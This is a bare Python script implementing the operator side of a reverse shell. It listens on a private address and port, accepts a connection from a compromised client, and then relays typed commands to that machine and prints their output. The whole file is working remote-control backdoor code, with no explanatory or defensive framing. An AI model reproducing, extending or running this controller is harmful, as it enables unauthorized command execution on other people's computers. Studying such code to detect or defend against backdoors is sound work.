import time, sys, socket, os
from colorama import Fore
from threading import Thread

SERVER_IP = "192.168.1.68"
SERVER_PORT = 4000
BUFFER_SIZE = 1024

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
RESET = Fore.RESET

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, SERVER_PORT))
s.listen(5)
client_socket, client_address = s.accept()
print(f"{YELLOW}[+] Connected to {client_address[0]}:{client_address[1]}.{RESET}")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print(f"{YELLOW}[+] Current working directory: {cwd}{RESET}")

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    try:
        results, cwd = output.split("<SEP>")
    except:
        results = output
    print(results)
sys.exit()